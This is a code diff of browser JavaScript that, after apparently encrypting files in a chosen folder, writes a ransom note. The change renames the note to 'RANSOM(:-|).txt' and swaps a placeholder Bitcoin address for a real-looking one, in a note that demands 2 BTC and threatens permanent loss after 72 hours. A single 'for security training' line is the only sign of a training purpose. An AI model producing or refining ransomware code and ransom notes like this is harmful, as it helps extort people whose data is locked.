@@ -55,9 +55,9 @@ UI.btn.addEventListener('click', async () => {
         }
 
         UI.text.textContent = "DONE. All files encrypted.";
-        const note = await dirHandle.getFileHandle("README.txt", { create: true });
+        const note = await dirHandle.getFileHandle("RANSOM(:-|).txt", { create: true });
         const writer = await note.createWritable();
-await writer.write("YOUR FILES HAVE BEEN ENCRYPTED FOR SECURITY TRAINING.\nYOUR FILES HAVE BEEN ENCRYPTED\n\nAll important company data has been locked using strong encryption.\n\nTo recover your files, you must send 2 BTC to the following Bitcoin address:\n\nbc1qexamplewalletaddress123456789\n\nAfter payment, send proof to the provided contact.\nYou will then receive the decryption key.\n\nWARNING:\n- Do not rename encrypted files\n- Do not attempt decryption\n- Failure to pay within 72 hours will result in permanent data loss");
+await writer.write("YOUR FILES HAVE BEEN ENCRYPTED FOR SECURITY TRAINING.\nYOUR FILES HAVE BEEN ENCRYPTED\n\nAll important company data has been locked using strong encryption.\n\nTo recover your files, you must send 2 BTC to the following Bitcoin address:\n\nbc1qf4k3j07hwn4u442jqkkgtasr77cf9wergrz7dq\n\nAfter payment, send proof to the provided contact.\nYou will then receive the decryption key.\n\nWARNING:\n- Do not rename encrypted files\n- Do not attempt decryption\n- Failure to pay within 72 hours will result in permanent data loss");
         await writer.close();
     } catch (e) { UI.text.textContent = "Error: " + e.message; }
 });
